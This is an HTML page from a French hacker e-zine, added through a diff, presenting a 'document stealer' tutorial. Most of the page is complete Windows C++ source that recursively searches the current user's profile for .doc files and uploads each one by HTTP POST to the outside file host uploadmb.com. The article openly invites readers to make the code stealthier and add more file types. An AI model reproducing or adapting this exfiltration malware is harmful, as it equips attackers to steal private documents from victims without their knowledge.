@@ -1,0 +1,362 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link href="css/shCore.css" rel="stylesheet" type="text/css" />
+    <link href="css/shThemeDefault.css" rel="stylesheet" type="text/css" />
+  </head>
+
+  <body>
+    <div id="head">LOTFREE Magazine numéro 9</div>
+    <div id="foot"><span style="float: left;"><br />Lancez la radio, cliquez ici : </span><a href="#" onclick="window.open('player.html', 'Player', 'toolbar=0,status=0,location=0,menubar=0,resizable=0,width=175,height=35')"><img src="icon.png" /></a></div>
+    <div id="left">
+      <dl>
+        <dt><strong>Welcome to your inbox Hacker !</strong></dt>
+        <dd>Directories :</dd>
+        <dt><a id="inbox" class="nav" href="inbox.html"> Inbox</a></dt>
+        <dd>One for the money</dd>
+        <dt><a id="drafts" class="nav" href="drafts.html">Drafts</a></dt>
+        <dd>Two for the show</dd>
+        <dt><a id="sent" class="nav" href="sent.html">Sent</a></dt>
+        <dd>Three to get ready</dd>
+        <dt><a id="spam" class="nav" href="spam.html">Spam</a></dt>
+        <dd>And four to go</dd>
+        <dt><a id="trash" class="nav" href="trash.html">Trash</a></dt>
+        <dd>Enjoy ;-)</dd>
+      </dl>
+    </div>
+
+    <div id="content">
+      <p><strong>Malware voleur de documents</strong></p>
+
+      <p>Comme on a pu le constater par les cas d'attaques ciblées dites <em>Advanced Persistent Threat</em> traitées sur d4n3wS, le mode opératoire utilisé par les pirates ainsi que les outils qu'il utilisent n'ont justement rien de bien avancés.<br />
+      Dans plusieurs des cas rendus publics par les victimes elles-même ou les boites de sécu ayant géré l'événement, l'attaque se faisait par l'envoi d'un fichier piégé en pièce jointe d'un mail qui une fois ouvert exploitait une vulnérabilité connue (et pour laquelle un pach existait) en se basant sur un exploit connu lui aussi comme ceux que l'on trouve dans le framework Metasploit...<br />
+      Le shellcode utilisé installait alors un bot (dans plusieurs cas connus il s'agissait de Poison Ivy) qui permettait aux pirates de se faire transférer les documents qu'ils souhaitaient.</p>
+
+      <p>Tout ça pour en arriver au fait que les attaques APT sont à la portée de tous pour peu que la sécurité de la cible tende vers zéro...</p>
+
+      <p>Du coup on s'est amusé à coder le programme que voici qui va chercher des fichiers .doc dans le dossiers Documents and Settings de l'utilisateur courant pour les uploader vers un script PHP sur Internet. Bref un voleur de documents :)<br />
+      Bien sûr <a href="../data/apt/doc_leaker.cpp">le code</a> est à adapter selon vos besoins pour le rendre plus discret, rajouter des paths, des extensions à chercher &amp; co.<br />
+      Une bonne partie du début du code vous sera normalement inutile mais peut être activée en cas de besoin. Ca permet de gérer le système de junctions introduit dans Vista qui apparemment pose problème uniquement avec les fonctions non-unicode... Sur ce <strong>PROFIT!</strong> comme on dit ;-)</p>
+
+<pre class="brush: cpp">#include &lt;windows.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;Shlobj.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;WinIoCtl.h&gt;
+#include &lt;WinInet.h&gt;
+
+#pragma comment(lib, &quot;Shell32.lib&quot;)
+#pragma comment(lib,&quot;wininet.lib&quot;)
+
+/* struct et fonction pompees depuis
+ * http://blog.kalmbach-software.de/2008/02/28/howto-correctly-read-reparse-data-in-vista/
+ * A l'origine rajoutees pour gerer les junctions dans Vista/7 mais lorsque j'ai passe
+ * le code en wchar le probleme ne se presentait plus...
+ * Je laisse quand meme le code a titre d'exemple.
+ */
+typedef struct _REPARSE_DATA_BUFFER {
+  ULONG  ReparseTag;
+  USHORT  ReparseDataLength;
+  USHORT  Reserved;
+  union {
+    struct {
+      USHORT  SubstituteNameOffset;
+      USHORT  SubstituteNameLength;
+      USHORT  PrintNameOffset;
+      USHORT  PrintNameLength;
+      ULONG   Flags;
+      WCHAR  PathBuffer[1];
+      } SymbolicLinkReparseBuffer;
+    struct {
+      USHORT  SubstituteNameOffset;
+      USHORT  SubstituteNameLength;
+      USHORT  PrintNameOffset;
+      USHORT  PrintNameLength;
+      WCHAR  PathBuffer[1];
+      } MountPointReparseBuffer;
+    struct {
+      UCHAR  DataBuffer[1];
+    } GenericReparseBuffer;
+  };
+} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;
+
+#define REPARSE_DATA_BUFFER_HEADER_SIZE  FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer)
+#define MAXIMUM_REPARSE_DATA_BUFFER_SIZE  ( 16 * 1024 )
+
+int resolve(wchar_t *filename, wchar_t *realpath)
+{
+  HANDLE hFile;
+
+  hFile = CreateFileW(filename,
+	  FILE_READ_EA,
+	  FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
+	  NULL,
+	  OPEN_EXISTING,
+	  FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
+	  NULL);
+
+  if (hFile == INVALID_HANDLE_VALUE)
+  {
+    wprintf(L&quot;Could not open dir '%s'; error: %d\n&quot;, filename, GetLastError());
+    return 1;
+  }
+
+  // Allocate the reparse data structure
+  DWORD dwBufSize = MAXIMUM_REPARSE_DATA_BUFFER_SIZE;
+  REPARSE_DATA_BUFFER* rdata;
+  rdata = (REPARSE_DATA_BUFFER*) malloc(dwBufSize);
+
+  // Query the reparse data
+  DWORD dwRetLen;
+  BOOL bRet = DeviceIoControl(hFile, FSCTL_GET_REPARSE_POINT, NULL, 0, rdata, dwBufSize, &amp;dwRetLen, NULL);
+  if (bRet == FALSE)
+  {
+    wprintf(L&quot;DeviceIoControl failed with error: %d\n&quot;, GetLastError());
+    CloseHandle(hFile);
+    return 1;
+  }
+  CloseHandle(hFile);
+
+  if (IsReparseTagMicrosoft(rdata-&gt;ReparseTag))
+  {
+    if (rdata-&gt;ReparseTag == IO_REPARSE_TAG_SYMLINK)
+    {
+      wprintf(L&quot;Symbolic-Link\n&quot;);
+      size_t plen = rdata-&gt;SymbolicLinkReparseBuffer.PrintNameLength / sizeof(wchar_t);
+      wcsncpy_s((WCHAR*)realpath, plen+1, &amp;rdata-&gt;SymbolicLinkReparseBuffer.PathBuffer[rdata-&gt;SymbolicLinkReparseBuffer.PrintNameOffset / sizeof(WCHAR)], plen);
+      realpath[plen] = 0;
+      wprintf(L&quot;PrintName (len: %d): '%s'\n&quot;, rdata-&gt;SymbolicLinkReparseBuffer.PrintNameLength, realpath);
+    }
+    else if (rdata-&gt;ReparseTag == IO_REPARSE_TAG_MOUNT_POINT)
+    {
+      wprintf(L&quot;Mount-Point\n&quot;);
+
+      size_t plen = rdata-&gt;MountPointReparseBuffer.PrintNameLength / sizeof(wchar_t);
+      wcsncpy_s((WCHAR*)realpath, plen+1, &amp;rdata-&gt;MountPointReparseBuffer.PathBuffer[rdata-&gt;MountPointReparseBuffer.PrintNameOffset / sizeof(WCHAR)], plen);
+      realpath[plen] = 0;
+      wprintf(L&quot;PrintName (len: %d): '%s'\n&quot;, rdata-&gt;MountPointReparseBuffer.PrintNameLength, realpath);
+    }
+    else
+    {
+      wprintf(L&quot;No Mount-Point or Symblic-Link...\n&quot;);
+    }
+  }
+  else
+  {
+    wprintf(L&quot;Not a Microsoft-reparse point - could not query data!\n&quot;);
+  }
+  free(rdata);
+  return 0;
+}
+
+// On entre dans le vrai-vrai comme la video de Pamela et Tommy Lee
+// Uploade le fichier fname sur le service uploadmb.com mais n'importe
+// quel page d'upload classique fera l'affaire.
+int upload(wchar_t *fname)
+{
+    // Le texte qui se trouve dans le body doit etre de l'ascii pur
+    static const char multipart_head1[] = &quot;--boundarylamestring\r\nContent-Disposition: form-data; name=\&quot;gfile\&quot;; filename=\&quot;&quot;;
+    static const char multipart_head2[] = &quot;\&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&quot;;
+    static const char multipart_end[] = &quot;\r\n--boundarylamestring--\r\n&quot;;
+    char *ascii_fname;
+    int len;
+
+    // Les headers passes aux fonctions sont en unicode
+    static const wchar_t hdrs[] = L&quot;Content-Type: multipart/form-data; boundary=boundarylamestring&quot;;
+    static LPCWSTR accept[2] = { L&quot;text/*&quot;, NULL};
+
+    // Buffer pour la lecture de la page web de reponse
+    char szData[7000];
+    char *url_start, *url_end;
+    DWORD dwBytesRead;
+    DWORD dwBytesWritten;
+
+    BYTE pBuffer[1024];
+
+    HANDLE hFile;
+    INTERNET_BUFFERSW BufferIn = {0};
+
+    wprintf(L&quot;Uploading %s...\n&quot;, fname);
+
+    // Ouverture du fichier a uploader
+    hFile = CreateFileW(fname,
+                GENERIC_READ,
+                FILE_SHARE_READ,
+                NULL,
+                OPEN_EXISTING,
+                FILE_ATTRIBUTE_NORMAL,
+                NULL);
+
+    BufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
+
+    // Structure concernant les headers
+    BufferIn.lpcszHeader = hdrs;
+    BufferIn.dwHeadersLength = wcslen(hdrs);
+    BufferIn.dwHeadersTotal = BufferIn.dwHeadersLength;
+
+    // On calcule le Content-Length de la requete
+    // Il faut compter la taille du fichier
+    BufferIn.dwBufferTotal = GetFileSize(hFile, NULL);
+    // Le debut du multipart
+    BufferIn.dwBufferTotal += strlen(multipart_head1);
+    BufferIn.dwBufferTotal += strlen(multipart_head2);
+
+    // La taille du nom du fichier
+    len = wcslen(fname) + 1;
+    ascii_fname = (char*)malloc(len);
+    WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, fname, -1, ascii_fname, len, NULL, NULL);
+
+    BufferIn.dwBufferTotal += strlen(ascii_fname);
+
+    // La fin du multipart
+    BufferIn.dwBufferTotal += strlen(multipart_end);
+
+    HINTERNET hSession = InternetOpenW(L&quot;Mozilla&quot;, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+
+    if(!hSession)
+    {
+      wprintf(L&quot;Error: InternetOpen\n&quot;);
+    }
+
+    // Share the cock bitch, share the cock
+    HINTERNET hConnect = InternetConnectW(hSession,
+                                         L&quot;uploadmb.com&quot;,
+                                         INTERNET_DEFAULT_HTTP_PORT,
+                                         NULL,
+                                         NULL,
+                                         INTERNET_SERVICE_HTTP,
+                                         0,
+                                         1);
+    if(!hConnect)
+    {
+      wprintf(L&quot;Error: InternetConnect\n&quot;);
+    }
+
+    HINTERNET hRequest = HttpOpenRequestW(hConnect,
+                                         (const wchar_t*) L&quot;POST&quot;,
+                                         L&quot;/index.php&quot;,
+                                         NULL, // lpszVersion -&gt; HTTP/1.1
+                                         NULL, // Referer : inutile
+                                         accept, // Tableau des types acceptes
+                                         INTERNET_FLAG_NO_CACHE_WRITE,
+                                         1); // 1
+    if(hRequest == NULL)
+    {
+      wprintf(L&quot;Error: HttpOpenRequest\n&quot;);
+    }
+
+    BOOL sent = HttpSendRequestExW(hRequest, &amp;BufferIn, NULL, 0, 0);
+    if(!sent)
+    {
+      wprintf(L&quot;Error: HttpSendRequest: %lu\n&quot;, GetLastError());
+    }
+    // Envoi de la marque de debut de fichier
+    InternetWriteFile(hRequest, multipart_head1, strlen(multipart_head1), &amp;dwBytesWritten);
+    // Le nom du fichier
+    InternetWriteFile(hRequest, ascii_fname, strlen(ascii_fname), &amp;dwBytesWritten);
+    // La fin du multipart
+    InternetWriteFile(hRequest, multipart_head2, strlen(multipart_head2), &amp;dwBytesWritten);
+
+    do
+    {
+		// Envoi du contenu du fichier
+        ReadFile(hFile, pBuffer, sizeof(pBuffer), &amp;dwBytesRead, NULL);
+        InternetWriteFile(hRequest,pBuffer, dwBytesRead, &amp;dwBytesWritten);
+    }
+    while (dwBytesRead == sizeof(pBuffer));
+
+    CloseHandle(hFile);
+
+    // Envoi de la marque de fin de fichier
+    InternetWriteFile(hRequest, multipart_end, strlen(multipart_end), &amp;dwBytesWritten);
+    HttpEndRequest(hRequest, NULL, 0, 0);
+
+    // Recupere l'url d'upload generee par le site
+    // A vous de voir si vous voulez en faire quelque chose :)
+    InternetReadFile(hRequest, szData, sizeof(szData)-1, &amp;dwBytesRead);
+    szData[dwBytesRead] = 0;
+    url_start = strstr(szData, &quot;http://uploadmb.com/dw.php?id=&quot;);
+    url_end = strstr(url_start, &quot;--&gt;&quot;);
+    *url_end = '\0';
+    printf(&quot;%s\n&quot;, url_start);
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hSession);
+
+    return 0;
+}
+
+/* Scanne tous les fichiers recursivement dans dir */
+void browsedir(wchar_t *dir)
+{
+	WIN32_FIND_DATAW FindFileData;
+	HANDLE hFind;
+	wchar_t fileext[5];
+	// wchar_t realpath[MAX_PATH];
+
+	if(!SetCurrentDirectoryW(dir)){
+		return;
+	}
+	hFind = FindFirstFileW(L&quot;*.*&quot;, &amp;FindFileData);
+	if (hFind != INVALID_HANDLE_VALUE)
+	{
+		do
+		{
+			if(FindFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)
+			{
+				if(wcscmp(FindFileData.cFileName, L&quot;.&quot;) != 0
+					&amp;&amp; wcscmp(FindFileData.cFileName, L&quot;..&quot;) != 0)
+				{
+					//wprintf(L&quot;%s\n&quot;, FindFileData.cFileName);
+					browsedir(FindFileData.cFileName);
+				}
+			}
+			else if ((FindFileData.dwFileAttributes &amp; FILE_ATTRIBUTE_REPARSE_POINT)
+				&amp;&amp; FindFileData.dwReserved0 == IO_REPARSE_TAG_MOUNT_POINT)
+			{
+				/* Si vous avez des pbs avec les junctions, essayez en decomantant ces lignes
+				resolve(FindFileData.cFileName, realpath);
+				browsedir(realpath);
+				*/
+			}
+			else
+			{
+				/* C'est ici que l'on gere les types de fichier */
+				_wsplitpath_s(FindFileData.cFileName, NULL, 0, NULL, 0, NULL, 0, fileext, 5);
+				if(wcscmp(fileext, L&quot;.doc&quot;) == 0)
+				{
+						upload(FindFileData.cFileName);
+				}
+			}
+		}
+		while (FindNextFileW(hFind, &amp;FindFileData) == TRUE);
+		FindClose(hFind);
+	}
+	SetCurrentDirectoryW(L&quot;..&quot;);
+}
+
+int _tmain(int argc, TCHAR *argv[])
+{
+	wchar_t userdir[MAX_PATH];
+
+	SHGetSpecialFolderPathW(NULL, userdir, CSIDL_PROFILE, 0);
+	browsedir(userdir);
+
+	wprintf(L&quot;Press a key\n&quot;);
+	getchar();
+	return 0;
+}</pre>
+    </div>
+<script language="javascript" src="js/shCore.js"></script>
+<script language="javascript" src="js/shBrushCpp.js"></script>
+<script type="text/javascript">
+  SyntaxHighlighter.all()
+</script>
+  </body>
+</html>
